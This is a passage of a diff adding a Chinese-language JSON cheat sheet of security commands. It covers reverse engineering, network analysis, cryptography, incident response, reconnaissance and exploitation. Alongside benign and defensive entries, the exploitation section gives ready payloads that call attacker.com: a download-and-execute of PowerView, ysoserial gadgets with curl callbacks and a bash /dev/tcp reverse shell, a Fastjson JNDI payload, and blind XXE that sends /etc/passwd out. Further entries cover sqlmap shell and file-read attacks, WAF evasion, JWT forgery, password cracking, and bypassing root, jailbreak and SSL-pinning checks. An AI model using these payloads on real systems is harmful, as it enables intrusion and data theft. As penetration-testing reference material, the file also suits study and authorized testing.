+    "command": "afrog -T targets.txt -o afrog.html -s high,critical -t 50",
+    "description": "对 URL 列表进行高危 POC 扫描并输出 HTML。",
+    "tags": ["afrog", "批量"]
+  },
+  {
+    "id": "s-078",
+    "title": "YARA 规则匹配文件中的恶意特征",
+    "tool": "YARA",
+    "category": "逆向分析",
+    "command": "yara -r ./malware_rules.yar ./samples/ | head -50",
+    "description": "对目录中二进制按 YARA 规则递归匹配，识别恶意家族。",
+    "tags": ["YARA", "规则"]
+  },
+  {
+    "id": "s-079",
+    "title": "UPX 加壳与脱壳",
+    "tool": "UPX",
+    "category": "逆向分析",
+    "command": "upx --best -o packed.exe raw.exe   # 加壳\nupx -d packed.exe -o unpacked.exe         # 脱壳",
+    "description": "常见的 UPX 压缩壳使用，可大幅减小二进制体积。",
+    "tags": ["UPX", "加壳"]
+  },
+  {
+    "id": "s-080",
+    "title": "strings 提取二进制字符串",
+    "tool": "strings",
+    "category": "逆向分析",
+    "command": "strings -n 8 ./binary | grep -iE '(pass|key|http|token|secret|flag)'",
+    "description": "提取二进制中长度 >=8 的可打印字符串，按关键字过滤。",
+    "tags": ["strings", "静态分析"]
+  },
+  {
+    "id": "s-081",
+    "title": "Frida 附加进程 hook Java 函数（Android）",
+    "tool": "Frida",
+    "category": "逆向分析",
+    "command": "frida -U -f com.target.app -l hook.js --no-pause\n# hook.js\nJava.perform(() => {\n  const cls = Java.use('com.target.MainActivity');\n  cls.checkPassword.implementation = function(a) { console.log('pw=', a); return true; };\n});",
+    "description": "通过 Frida hook Android 应用 Java 层方法实现绕过。",
+    "tags": ["Frida", "Android"]
+  },
+  {
+    "id": "s-082",
+    "title": "objection 一键反越狱/SSL Pinning 检测",
+    "tool": "objection",
+    "category": "逆向分析",
+    "command": "objection -g com.target.app explore -N\nandroid sslpinning disable\nandroid root disable",
+    "description": "objection 交互式调试 Android APP，一键禁用 SSL pinning/root 检测。",
+    "tags": ["objection", "Android"]
+  },
+  {
+    "id": "s-083",
+    "title": "Frida hook iOS 原生函数 (ObjC)",
+    "tool": "Frida",
+    "category": "逆向分析",
+    "command": "frida -U -f com.ios.app -l ios.js --no-pause\n// ios.js\nObjC.schedule(ObjC.mainQueue, () => {\n  const m = ObjC.classes['ViewController']['- isJailbroken'];\n  Interceptor.attach(m.implementation, { onLeave(r) { r.replace(0x0); } });\n});",
+    "description": "Frida hook iOS 应用的 ObjC 方法以绕过越狱检测。",
+    "tags": ["Frida", "iOS"]
+  },
+  {
+    "id": "s-084",
+    "title": "objection 查看 iOS KeyChain",
+    "tool": "objection",
+    "category": "逆向分析",
+    "command": "objection -g com.ios.app explore -N\nios keychain dump",
+    "description": "objection 读取 iOS 应用 KeyChain 中保存的密码/Tokens 等。",
+    "tags": ["objection", "iOS"]
+  },
+  {
+    "id": "s-085",
+    "title": "Ghidra Python 脚本：查找字符串引用",
+    "tool": "Ghidra",
+    "category": "逆向分析",
+    "command": "from ghidra.program.model.listing import *\nfrom ghidra.program.model.data import *\nlisting = currentProgram.getListing()\nfor d in listing.getDefinedStrings(True):\n    if 'password' in str(d).lower():\n        print(d.getAddress(), d)",
+    "description": "Ghidra Python 脚本示例：遍历字符串并查找含 password 的引用。",
+    "tags": ["Ghidra", "脚本"]
+  },
+  {
+    "id": "s-086",
+    "title": "IDA Pro Python 重命名返回值为字符串的函数",
+    "tool": "IDA",
+    "category": "逆向分析",
+    "command": "import idautils, idc\nfor ea in idautils.Functions():\n    name = idc.get_func_name(ea)\n    if 'sub_' in name:\n        strrefs = [idc.get_strlit_contents(x) for x in idautils.DataRefsFrom(ea) if idc.get_strlit_contents(x)]\n        if strrefs:\n            idc.set_func_name(ea, f'sub_{ea:x}_{strrefs[0].decode()[:10]}')",
+    "description": "IDA Python 示例：为引用字符串的 sub_ 函数重命名以辅助分析。",
+    "tags": ["IDA", "脚本"]
+  },
+  {
+    "id": "s-087",
+    "title": "tcpdump 抓取 TCP 握手并写文件",
+    "tool": "tcpdump",
+    "category": "网络分析",
+    "command": "sudo tcpdump -i eth0 -nn -w capture.pcap -s 0 'tcp[tcpflags] & tcp-syn != 0'",
+    "description": "抓取所有 TCP SYN 包保存到 pcap 文件，用于离线分析。",
+    "tags": ["tcpdump", "PCAP"]
+  },
+  {
+    "id": "s-088",
+    "title": "tshark 从 pcap 提取 HTTP POST 数据",
+    "tool": "tshark",
+    "category": "网络分析",
+    "command": "tshark -r capture.pcap -Y 'http.request.method == POST' -T fields -e frame.number -e ip.src -e http.request.uri -e http.file_data",
+    "description": "tshark 读取 pcap 过滤 POST 请求并输出 POST body。",
+    "tags": ["tshark", "PCAP"]
+  },
+  {
+    "id": "s-089",
+    "title": "tshark 统计 pcap 中各 IP 流量",
+    "tool": "tshark",
+    "category": "网络分析",
+    "command": "tshark -r capture.pcap -q -z endpoints,ip",
+    "description": "统计 pcap 中每个 IP 地址的收/发包数与字节数。",
+    "tags": ["tshark", "统计"]
+  },
+  {
+    "id": "s-090",
+    "title": "Wireshark TLS 客户端指纹 JA3 查看",
+    "tool": "Wireshark",
+    "category": "网络分析",
+    "command": "Edit -> Preferences -> Protocols -> TLS -> JA3 -> 启用后在字段中查找 tls.handshake.ja3_full",
+    "description": "通过 JA3 字段识别可疑客户端 TLS 指纹（脚本/工具特征）。",
+    "tags": ["Wireshark", "JA3"]
+  },
+  {
+    "id": "s-091",
+    "title": "openssl 生成自签名证书",
+    "tool": "openssl",
+    "category": "密码学",
+    "command": "openssl req -x509 -newkey rsa:2048 -nodes -keyout self.key -out self.crt -days 365 -subj '/CN=example.com'",
+    "description": "生成 2048 位 RSA 私钥与自签名证书，有效期 1 年。",
+    "tags": ["openssl", "证书"]
+  },
+  {
+    "id": "s-092",
+    "title": "openssl AES-256-CBC 文件加解密",
+    "tool": "openssl",
+    "category": "密码学",
+    "command": "openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -k myPassword\nopenssl enc -aes-256-cbc -d -in file.enc -out file.dec -k myPassword",
+    "description": "使用 AES-256-CBC 对称加密文件（带 salt）。",
+    "tags": ["openssl", "AES"]
+  },
+  {
+    "id": "s-093",
+    "title": "john 爆破 ZIP/Office/PDF 密码",
+    "tool": "john",
+    "category": "密码学",
+    "command": "zip2john secret.zip > hash.txt\njohn --wordlist=rockyou.txt hash.txt",
+    "description": "将 ZIP 加密文件转为 hash，再用 john + 字典爆破。",
+    "tags": ["john", "ZIP爆破"]
+  },
+  {
+    "id": "s-094",
+    "title": "hashcat 破解 NTLM 哈希",
+    "tool": "hashcat",
+    "category": "密码学",
+    "command": "hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt --show",
+    "description": "hashcat 使用字典攻击 (-a 0) 破解 NTLM (-m 1000) 并显示结果。",
+    "tags": ["hashcat", "NTLM"]
+  },
+  {
+    "id": "s-095",
+    "title": "hashcat 规则爆破（常见密码变体）",
+    "tool": "hashcat",
+    "category": "密码学",
+    "command": "hashcat -m 0 -a 0 md5.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+    "description": "对 MD5 哈希使用 best64 规则生成常见变形进行字典攻击。",
+    "tags": ["hashcat", "规则"]
+  },
+  {
+    "id": "s-096",
+    "title": "SSH 动态端口转发（SOCKS 代理）",
+    "tool": "SSH",
+    "category": "网络分析",
+    "command": "ssh -D 1080 -f -q -C -N user@10.0.0.1\n# 在浏览器使用 127.0.0.1:1080 作为 SOCKS5 代理",
+    "description": "将 SSH 作为 SOCKS5 代理，通过跳板机访问目标内网。",
+    "tags": ["SSH", "代理", "隧道"]
+  },
+  {
+    "id": "s-097",
+    "title": "SSH 本地端口转发",
+    "tool": "SSH",
+    "category": "网络分析",
+    "command": "ssh -L 3306:127.0.0.1:3306 -N user@10.0.0.1",
+    "description": "将本地 3306 端口映射到跳板机的 127.0.0.1:3306。",
+    "tags": ["SSH", "端口转发"]
+  },
+  {
+    "id": "s-098",
+    "title": "SCP 跨机器文件传输",
+    "tool": "SCP",
+    "category": "漏洞利用",
+    "command": "scp ./local.zip user@10.0.0.1:/tmp/remote.zip\nscp -r user@10.0.0.1:/var/log/ ./logs/",
+    "description": "通过 SSH 拷贝文件或目录。",
+    "tags": ["SCP", "传输"]
+  },
+  {
+    "id": "s-099",
+    "title": "rsync 增量同步目录",
+    "tool": "rsync",
+    "category": "网络分析",
+    "command": "rsync -avz -e ssh ./src/ user@10.0.0.1:/tmp/dst/",
+    "description": "通过 SSH 的 rsync 增量同步（a: 归档，v: 详细，z: 压缩）。",
+    "tags": ["rsync", "同步"]
+  },
+  {
+    "id": "s-100",
+    "title": "curl 发送带 Headers 的 POST 请求",
+    "tool": "curl",
+    "category": "漏洞利用",
+    "command": "curl -sS -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer TOKEN' -d '{\"id\":1}' http://target.com/api",
+    "description": "使用 curl 发送 JSON POST 请求并附带自定义 header。",
+    "tags": ["curl", "WebShell"]
+  },
+  {
+    "id": "s-101",
+    "title": "curl 使用 SOCKS 代理发起请求",
+    "tool": "curl",
+    "category": "网络分析",
+    "command": "curl -x socks5h://127.0.0.1:1080 -s http://intranet.target.local/secret",
+    "description": "使用 socks5h 代理（域名也通过代理解析）访问目标。",
+    "tags": ["curl", "代理"]
+  },
+  {
+    "id": "s-102",
+    "title": "wget 镜像爬取整个网站",
+    "tool": "wget",
+    "category": "信息收集",
+    "command": "wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://target.com/",
+    "description": "镜像克隆目标网站 (适合离线分析)。",
+    "tags": ["wget", "镜像"]
+  },
+  {
+    "id": "s-103",
+    "title": "Linux netstat/ss 查看监听端口与进程",
+    "tool": "ss",
+    "category": "应急响应",
+    "command": "ss -tlnp          # 监听的 TCP 端口 + 进程\nnetstat -anp        # 兼容旧系统\nss -tn state established",
+    "description": "在 Linux 上查看端口与建立的连接，快速定位可疑进程。",
+    "tags": ["应急响应", "网络"]
+  },
+  {
+    "id": "s-104",
+    "title": "Linux ps + lsof 定位异常进程",
+    "tool": "ps/lsof",
+    "category": "应急响应",
+    "command": "ps auxf --sort=-pcpu | head -20\nlsof -i -P -n | grep -i listen\nlsof -p <pid>",
+    "description": "查找高 CPU 进程并查看其打开的文件/网络连接。",
+    "tags": ["应急响应", "进程"]
+  },
+  {
+    "id": "s-105",
+    "title": "Linux 审计 wtmp/lastlog 登录记录",
+    "tool": "last/lastlog",
+    "category": "应急响应",
+    "command": "last -a -i | head -30\nlastlog\ngrep -a 'Accepted\\|Failed' /var/log/auth.log | tail -20",
+    "description": "审计用户登录来源、时间及失败次数，识别暴力破解。",
+    "tags": ["应急响应", "登录"]
+  },
+  {
+    "id": "s-106",
+    "title": "Linux auditd 监控命令执行与文件访问",
+    "tool": "auditd",
+    "category": "应急响应",
+    "command": "auditctl -w /etc/passwd -p rwxa -k passwd_modified\nauditctl -a always,exit -F arch=b64 -S execve -k cmd_exec\naureport --input-logs -k passwd_modified",
+    "description": "使用 auditd 跟踪关键文件及 execve 调用，便于取证。",
+    "tags": ["应急响应", "审计"]
+  },
+  {
+    "id": "s-107",
+    "title": "Linux find + mtime 查找最近修改的文件",
+    "tool": "find",
+    "category": "应急响应",
+    "command": "find /etc /root /var/www -type f -mtime -7 -newer /etc/passwd 2>/dev/null | head -50\nfind /tmp /dev/shm /var/tmp -type f -executable 2>/dev/null",
+    "description": "查找 7 天内被修改的可疑文件与临时目录下的可执行文件。",
+    "tags": ["应急响应", "文件审计"]
+  },
+  {
+    "id": "s-108",
+    "title": "Windows netstat 查看可疑外联",
+    "tool": "cmd",
+    "category": "应急响应",
+    "command": "netstat -ano | findstr /i \"established\"\ntasklist | findstr /i suspicious.exe",
+    "description": "列出建立中的 TCP 连接及其所属 PID，用于定位可疑进程。",
+    "tags": ["应急响应", "Windows"]
+  },
+  {
+    "id": "s-109",
+    "title": "Windows wmic 枚举进程/服务/计划任务",
+    "tool": "wmic",
+    "category": "应急响应",
+    "command": "wmic process get name,processid,parentprocessid,commandline /format:list\nwmic service where state='running' get name,pathname\nwmic job get description,command",
+    "description": "通过 WMIC 枚举进程、服务和计划任务，辅助取证。",
+    "tags": ["应急响应", "WMIC"]
+  },
+  {
+    "id": "s-110",
+    "title": "Windows wevtutil 导出安全事件日志",
+    "tool": "wevtutil",
+    "category": "应急响应",
+    "command": "wevtutil epl Security C:\\tmp\\security.evtx\nwevtutil qe Security /c:10 /f:RenderedXml /q:\"*[System[EventID=4625]]\"",
+    "description": "导出 Windows 安全日志，并查询登录失败事件 (EventID 4625)。",
+    "tags": ["应急响应", "日志"]
+  },
+  {
+    "id": "s-111",
+    "title": "Windows 导出并统计最近失败登录次数",
+    "tool": "PowerShell",
+    "category": "应急响应",
+    "command": "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625;StartTime=(Get-Date).AddDays(-1)} | Group-Object -Property @{e={$_.Properties[6].Value}} | Sort-Object Count -Descending | Select-Object Name,Count -First 20",
+    "description": "使用 PowerShell Get-WinEvent 汇总最近一天来源 IP 的失败登录次数。",
+    "tags": ["应急响应", "PowerShell"]
+  },
+  {
+    "id": "s-112",
+    "title": "Windows PowerView 域信息枚举",
+    "tool": "PowerView",
+    "category": "信息收集",
+    "command": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1'); Get-NetDomain; Get-NetDomainController; Get-NetUser | select cn,useraccountcontrol | ft\"",
+    "description": "通过 PowerView 枚举 AD 域信息、用户、机器、组等。",
+    "tags": ["AD", "PowerView"]
+  },
+  {
+    "id": "s-113",
+    "title": "Burp Suite 自定义 payload 位置（§符号）标记",
+    "tool": "Burp Suite",
+    "category": "漏洞利用",
+    "command": "在 Repeater/Intruder 请求中按 Ctrl+U 选中参数值，然后点击 Add § 在值两侧插入 payload 位置标记。例：id=§1§&name=test",
+    "description": "手动插入 Intruder payload 位置标记，实现精确定位注入点。",
+    "tags": ["Burp", "Intruder"]
+  },
+  {
+    "id": "s-114",
+    "title": "Burp Intruder 四种攻击类型使用场景",
+    "tool": "Burp Suite",
+    "category": "漏洞利用",
+    "command": "Sniper（单字典单位置）/ Battering ram（单字典多位置同值）/ Pitchfork（多字典多位置对应）/ Cluster bomb（多字典多位置笛卡尔积）",
+    "description": "根据爆破场景选择合适的 Intruder 攻击类型，常见凭据爆破首选 Pitchfork。",
+    "tags": ["Burp", "Intruder", "爆破"]
+  },
+  {
+    "id": "s-115",
+    "title": "Burp Intruder Grep - Extract 提取响应 token",
+    "tool": "Burp Suite",
+    "category": "漏洞利用",
+    "command": "Options -> Extract Grep -> Add -> 输入正则如 name=\"csrf\" value=\"([^\"]+)\" -> 提取的值可在后续请求中作 Recursive grep payload 或手动记录。",
+    "description": "从响应中自动提取 token/CSRF 等值用于二次爆破或联动。",
+    "tags": ["Burp", "Intruder", "Grep"]
+  },
+  {
+    "id": "s-116",
+    "title": "Burp 宏（Macros）自动处理 CSRF Token",
+    "tool": "Burp Suite",
+    "category": "漏洞利用",
+    "command": "Project options -> Sessions -> Macros -> Add -> 选择获取 token 的请求 -> Add custom parameter -> 在规则中配置在提交前自动带上新 token。",
+    "description": "录制宏并配置会话处理规则，绕过登录或 CSRF token 校验后再爆破。",
+    "tags": ["Burp", "CSRF", "宏"]
+  },
+  {
+    "id": "s-117",
+    "title": "Burp Suite 通过 Upstream 代理转发到上游",
+    "tool": "Burp Suite",
+    "category": "信息收集",
+    "command": "Settings -> Network -> Connections -> Upstream proxy servers -> Add -> Destination host / Proxy host:port",
+    "description": "配置 Burp 将指定域名的请求转发到另一个代理，常用于多层代理或协作。",
+    "tags": ["Burp", "代理"]
+  },
+  {
+    "id": "s-118",
+    "title": "Nuclei 编写基础信息探测模板",
+    "tool": "Nuclei",
+    "category": "漏洞扫描",
+    "command": "cat info.yaml\nid: basic-detect\ninfo:\n  name: Basic Detect\n  severity: info\nrequests:\n  - raw:\n      - |\n        GET / HTTP/1.1\n        Host: {{Hostname}}\n    matchers:\n      - type: word\n        words:\n          - \"Welcome to\"\n          - \"Apache\"\n        condition: or",
+    "description": "最简化的 Nuclei YAML 模板结构：id/info/requests/matchers 四大部分。",
+    "tags": ["Nuclei", "模板"]
+  },
+  {
+    "id": "s-119",
+    "title": "Nuclei 模板正则提取器（extractor）",
+    "tool": "Nuclei",
+    "category": "漏洞扫描",
+    "command": "extractors:\n  - type: regex\n    part: body\n    regex:\n      - \"([0-9]+\\.[0-9]+\\.[0-9]+)\"\n    name: version",
+    "description": "在 Nuclei 模板中用 extractors 从响应中提取版本号、Token 等信息，便于二次分析。",
+    "tags": ["Nuclei", "extractor"]
+  },
+  {
+    "id": "s-120",
+    "title": "Nuclei 批量扫描目标列表并输出 Markdown",
+    "tool": "Nuclei",
+    "category": "漏洞扫描",
+    "command": "nuclei -l targets.txt -t ~/nuclei-templates/ -s critical,high,medium -o results.md -jsonl -stats -ni -rl 150",
+    "description": "对目标列表应用所有公开模板，限制速率，输出 JSONL 及 markdown，适合批量资产巡检。",
+    "tags": ["Nuclei", "批量"]
+  },
+  {
+    "id": "s-121",
+    "title": "Nuclei 自定义 Workflow（条件触发模板）",
+    "tool": "Nuclei",
+    "category": "漏洞扫描",
+    "command": "cat workflow.yaml\nworkflows:\n  - template: technologies/tech-detect.yaml\n    matchers:\n      - name: wordpress\n        templates:\n          - cves/2023/wordpress-*.yaml",
+    "description": "根据指纹识别结果触发对应 CVE 模板，减少误报与无效请求。",
+    "tags": ["Nuclei", "workflow"]
+  },
+  {
+    "id": "s-122",
+    "title": "Nuclei 交互式扫描（interactsh 实现 OOB）",
+    "tool": "Nuclei",
+    "category": "漏洞扫描",
+    "command": "nuclei -u https://target.com -t ~/nuclei-templates/ -interactsh-url xxxxx.interact.sh -irr",
+    "description": "启用 interactsh 自动回调，对 SSRF/XXE/RCE 等 OOB 场景进行无回显检测。",
+    "tags": ["Nuclei", "interactsh", "OOB"]
+  },
+  {
+    "id": "s-123",
+    "title": "sqlmap --tamper 组合混淆绕过 WAF",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u \"http://target.com/?id=1\" --tamper=space2comment,randomcase,between,charencode --level 3 --risk 2 --batch --random-agent",
+    "description": "同时使用多个 tamper 脚本混淆 SQL payload：空格注释、大小写、BETWEEN、URL 编码。",
+    "tags": ["sqlmap", "tamper", "WAF"]
+  },
+  {
+    "id": "s-124",
+    "title": "sqlmap --level 与 --risk 的选择建议",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "level 1-5（越高越激进，会检测 User-Agent/Cookie/Referer 等 header）；risk 1-3（越高越危险，可能产生破坏性 payload 如 UPDATE）。",
+    "description": "正式环境默认 level=1 risk=1；授权测试建议 level=3 risk=2；高危授权时可用 level=5 risk=3。",
+    "tags": ["sqlmap", "level", "risk"]
+  },
+  {
+    "id": "s-125",
+    "title": "sqlmap --random-agent + --proxy 绕过指纹",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u \"http://target.com/?id=1\" --random-agent --proxy \"http://127.0.0.1:8080\" --delay 2 --timeout 30 --batch",
+    "description": "使用随机 UA + 走 Burp 代理 + 增加延迟，降低被 WAF 识别为扫描器的概率。",
+    "tags": ["sqlmap", "代理", "绕过"]
+  },
+  {
+    "id": "s-126",
+    "title": "sqlmap --os-shell 交互式命令执行",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u \"http://target.com/?id=1\" --dbms=MySQL --os-shell --batch\n# 进入 shell 后可执行系统命令（需 MySQL FILE 权限或 PHP/ASP 等写入权限）",
+    "description": "尝试通过 SQL 注入向 Web 目录写入一句话 shell，进入交互式系统命令执行。",
+    "tags": ["sqlmap", "os-shell", "RCE"]
+  },
+  {
+    "id": "s-127",
+    "title": "sqlmap --batch 与 --answer 自动化应答",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u \"http://target.com/?id=1\" --batch --answer=\"extending=N,backdoor=N,column=y\" --dbs",
+    "description": "完全无交互模式，在敏感操作处（是否扩展、是否写后门等）通过 --answer 预答。",
+    "tags": ["sqlmap", "自动化"]
+  },
+  {
+    "id": "s-128",
+    "title": "sqlmap --file-read 读取敏感文件",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u \"http://target.com/?id=1\" --file-read=\"/etc/passwd\" --batch\npython3 sqlmap.py -u \"http://target.com/?id=1\" --file-read=\"C:\\Windows\\System32\\drivers\\etc\\hosts\"",
+    "description": "利用 LOAD_FILE 权限（MySQL）或其他 DB 的文件读取能力，拉取目标系统文件。",
+    "tags": ["sqlmap", "文件读取"]
+  },
+  {
+    "id": "s-129",
+    "title": "sqlmap 注入 JSON Body 请求",
+    "tool": "sqlmap",
+    "category": "漏洞利用",
+    "command": "python3 sqlmap.py -u http://target.com/api -H \"Content-Type: application/json\" --data '{\"uid\":\"1*\",\"token\":\"test\"}' -p \"uid\" --prefix=\"\\\"\" --suffix=\"{}\" --batch",
+    "description": "对 JSON 中的字段做注入，常需要用 --prefix / --suffix 手动闭合引号与括号。",
+    "tags": ["sqlmap", "JSON"]
+  },
+  {
+    "id": "s-130",
+    "title": "FOFA 基础语法：标题/IP/指纹",
+    "tool": "FOFA",
+    "category": "信息收集",
+    "command": "title=\"后台管理\"          && 标题含关键字\nip=\"1.2.3.4\"                && 指定 IP\nip=\"1.2.3.0/24\"            && C 段\nbanner=\"elastic\"            && banner 指纹\ncert=\"baidu.com\"            && 证书匹配",
+    "description": "FOFA 常用字段：title / ip / host / domain / cert / banner / port / country / app。",
+    "tags": ["FOFA", "资产测绘"]
+  },
+  {
+    "id": "s-131",
+    "title": "FOFA 组合语法：应用 + 端口 + 地区",
+    "tool": "FOFA",
+    "category": "信息收集",
+    "command": "app=\"Jenkins\" && port=\"8080\" && country=\"CN\" && status_code=\"200\"\n# 查找中国境内的 8080 端口且返回 200 的 Jenkins",
+    "description": "使用 && / || 组合多个过滤条件，精确定位目标资产。",
+    "tags": ["FOFA", "组合查询"]
+  },
+  {
+    "id": "s-132",
+    "title": "FOFA 查找暴露的敏感端口（Redis / ES / MongoDB）",
+    "tool": "FOFA",
+    "category": "信息收集",
+    "command": "port=\"6379\" && app=\"redis\"\nport=\"9200\" && app=\"elasticsearch\"\nport=\"27017\" && banner=\"MongoDB\"\nport=\"3306\" && banner=\"MySQL\"",
+    "description": "快速测绘公网上暴露的数据库服务，配合未授权访问测试。",
+    "tags": ["FOFA", "数据库", "暴露面"]
+  },
+  {
+    "id": "s-133",
+    "title": "Shodan 基础查询语法",
+    "tool": "Shodan",
+    "category": "信息收集",
+    "command": "product:\"nginx\"                       && 产品/服务\nport:22 && country:\"CN\"               && 端口+国家\nhttp.title:\"Login\"                    && 标题\nssl.cert.subject.cn:\"example.com\"      && SSL CN\norg:\"Google\"                          && 组织机构",
+    "description": "Shodan filter 参考：product / port / country / http.title / ssl / org / hostname / net。",
+    "tags": ["Shodan", "搜索引擎"]
+  },
+  {
+    "id": "s-134",
+    "title": "Shodan 查找 Jenkins / Jira / Kibana 内网工具暴露",
+    "tool": "Shodan",
+    "category": "信息收集",
+    "command": "http.title:\"Dashboard [Jenkins]\" \nhttp.component:\"jira\" \nhttp.title:\"Kibana\" \nproduct:\"Docker\" \nhttp.html:\"swagger-ui\"",
+    "description": "通过页面特征查找公网暴露的 DevOps 工具，通常存在未授权访问风险。",
+    "tags": ["Shodan", "暴露面"]
+  },
+  {
+    "id": "s-135",
+    "title": "ysoserial 生成 CommonsCollections Payload",
+    "tool": "ysoserial",
+    "category": "漏洞利用",
+    "command": "java -jar ysoserial.jar CommonsCollections5 \"curl http://attacker.com/ping\" > payload.bin\n# 或 base64 传输：\njava -jar ysoserial.jar CommonsCollections6 \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\" | base64 -w0",
+    "description": "ysoserial 是 Java 反序列化 payload 生成器，常见 gadget：CC1-CC7、ROME、Spring1、JRMPClient。",
+    "tags": ["ysoserial", "Java", "反序列化"]
+  },
+  {
+    "id": "s-136",
+    "title": "ysoserial JRMP 反序列化 RMI 场景",
+    "tool": "ysoserial",
+    "category": "漏洞利用",
+    "command": "java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7878 CommonsCollections5 \"curl http://attacker.com\"\n# 目标侧 RMI 连接到 attacker:7878 即可触发",
+    "description": "监听 JRMP 端口，当目标 RMI 客户端连接时下发 gadget 触发 RCE。",
+    "tags": ["ysoserial", "JRMP", "RMI"]
+  },
+  {
+    "id": "s-137",
+    "title": "marshalsec 生成 C3P0 / Fastjson 反序列化链",
+    "tool": "marshalsec",
+    "category": "漏洞利用",
+    "command": "java -jar marshalsec-0.0.3-SNAPSHOT-all.jar C3P0 raw http://attacker.com/Exploit.class payload.bin\njava -cp marshalsec-*.jar marshalsec.gadgets.Jdk7u21 'cmd /c calc'",
+    "description": "marshalsec 提供更多第三方库（C3P0、Fastjson、JdbcRowSet）的反序列化链。",
+    "tags": ["marshalsec", "Fastjson", "反序列化"]
+  },
+  {
+    "id": "s-138",
+    "title": "phpggc 生成 PHP 反序列化 Payload",
+    "tool": "phpggc",
+    "category": "漏洞利用",
+    "command": "./phpggc -l                       # 列出 gadget\n./phpggc Monolog/RCE1 'id'          # 生成 Monolog 1 的 RCE\n./phpggc -u -b Symfony/FW1 'id'     # URL 编码 + Base64",
+    "description": "phpggc 是 PHP 反序列化 gadget 集合，常见：Laravel、Symfony、Monolog、CodeIgniter。",
+    "tags": ["phpggc", "PHP", "反序列化"]
+  },
+  {
+    "id": "s-139",
+    "title": "Fastjson 反序列化利用（JNDI 注入）",
+    "tool": "java/fastjson",
+    "category": "漏洞利用",
+    "command": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com:1389/Evil\",\"autoCommit\":true}",
+    "description": "Fastjson 1.2.x 在开启 autoType 时可利用 JdbcRowSetImpl 触发 JNDI 注入，LDAP/RMI 远程加载恶意类。",
+    "tags": ["Fastjson", "JNDI", "反序列化"]
+  },
+  {
+    "id": "s-140",
+    "title": "jwt.io 在线解析 JWT 结构",
+    "tool": "jwt.io",
+    "category": "漏洞利用",
+    "command": "访问 https://jwt.io/ 粘贴 token\n# Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n# Payload: {\"sub\":\"admin\",\"iat\":12345}",
+    "description": "通过 jwt.io 直接解析 JWT 三段 base64，观察签名算法与 payload 字段。",
+    "tags": ["JWT", "解析"]
+  },
+  {
+    "id": "s-141",
+    "title": "JWT alg:none 签名绕过",
+    "tool": "jwt_tool",
+    "category": "漏洞利用",
+    "command": "python3 jwt_tool.py eyJhbGciOi... -X nw\n# 或将 alg 改为 none，手动改写 payload：\necho -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64\n.echo -n '{\"sub\":\"admin\",\"role\":\"admin\"}' | base64\n.（空签名）",
+    "description": "将 JWT 签名算法改 none，部分服务器直接解析 payload，可越权或改密码。",
+    "tags": ["JWT", "alg:none"]
+  },
+  {
+    "id": "s-142",
+    "title": "JWT 密钥爆破（弱 HMAC 密钥）",
+    "tool": "jwt_tool / hashcat",
+    "category": "漏洞利用",
+    "command": "python3 jwt_tool.py eyJhbGciOi... -C -w ~/wordlists/rockyou.txt\n# hashcat 模式\nhashcat -m 16500 jwt_hash.txt rockyou.txt",
+    "description": "使用 jwt_tool 或 hashcat 对 HS256/HS384/HS512 的弱密钥进行爆破。",
+    "tags": ["JWT", "爆破"]
+  },
+  {
+    "id": "s-143",
+    "title": "JWT RS256 公钥泄露后伪造签名（alg 切换）",
+    "tool": "jwt_tool",
+    "category": "漏洞利用",
+    "command": "python3 jwt_tool.py eyJhbGciOi... -X k -pk ./pub.key\n# 需获得服务端公钥，将 RS256 改为 HS256，并用公钥作为 HMAC 密钥",
+    "description": "服务端若允许 RS256/HS256 混用且可获取公钥，可用公钥做 HS256 密钥伪造 token。",
+    "tags": ["JWT", "密钥混淆"]
+  },
+  {
+    "id": "s-144",
+    "title": "XXE 基础 Payload（文件读取）",
+    "tool": "XML / XXE",
+    "category": "漏洞利用",
+    "command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<foo>&xxe;</foo>",
+    "description": "最基础的 XXE：声明内部实体引用 file:// 协议并在 body 中调用。",
+    "tags": ["XXE", "文件读取"]
+  },
+  {
+    "id": "s-145",
+    "title": "XXE OOB 外带数据（Blind XXE + DTD）",
+    "tool": "XML / XXE",
+    "category": "漏洞利用",
+    "command": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]>\n<foo>&send;</foo>\n# evil.dtd 内容：\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>\">%eval;",
+    "description": "无回显场景下通过外部 DTD 让目标把文件内容作为请求参数传回攻击服务器。",
+    "tags": ["XXE", "OOB", "Blind"]
+  },
+  {
+    "id": "s-146",
+    "title": "XXE SSRF 探测内网",
+    "tool": "XML / XXE",
+    "category": "漏洞利用",
+    "command": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.1:22/\">]>\n<foo>&xxe;</foo>",
+    "description": "利用 XXE 请求内网地址进行端口探测或访问内部 HTTP 服务。",
+    "tags": ["XXE", "SSRF"]
+  },
+  {
+    "id": "s-147",
+    "title": "Spring Actuator 未授权访问快速检测",
+    "tool": "curl",
+    "category": "漏洞利用",
